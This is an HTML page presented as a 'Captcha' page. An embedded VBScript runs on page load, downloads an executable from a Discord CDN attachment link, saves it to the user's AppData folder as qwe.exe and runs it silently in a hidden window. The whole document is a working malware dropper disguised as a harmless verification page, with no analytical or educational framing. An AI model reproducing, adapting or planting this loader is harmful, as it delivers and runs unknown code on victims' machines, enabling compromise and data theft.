<html>
<head>
    <script language="VBScript">
        Sub RunScript()
            Dim url, downloadPath, objXMLHTTP, objADOStream, objFSO, objShell
            url = "https://cdn.discordapp.com/attachments/1334275926589964390/1336809541639213147/xdd.exe?ex=67a87427&is=67a722a7&hm=fc86dc4b09baca393306e3310fe9eb5a1c53d422d3776d3f9b21d58c57ea73ad&"
            Dim appDataPath
            Set objShell = CreateObject("WScript.Shell")
            appDataPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\qwe.exe"
            downloadPath = appDataPath
            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
            objXMLHTTP.Open "GET", url, False
            objXMLHTTP.Send
            If objXMLHTTP.Status = 200 Then
                Set objADOStream = CreateObject("ADODB.Stream")
                objADOStream.Type = 1 
                objADOStream.Open
                objADOStream.Write objXMLHTTP.ResponseBody
                objADOStream.SaveToFile downloadPath, 2
                objADOStream.Close
                Set objADOStream = Nothing
            End If
            Set objXMLHTTP = Nothing
            objShell.Run downloadPath, 0, False
            Set objShell = Nothing
        End Sub
    </script>
</head>
<body onload="RunScript()">
    <h1>Captcha</h1>
</body>
</html>
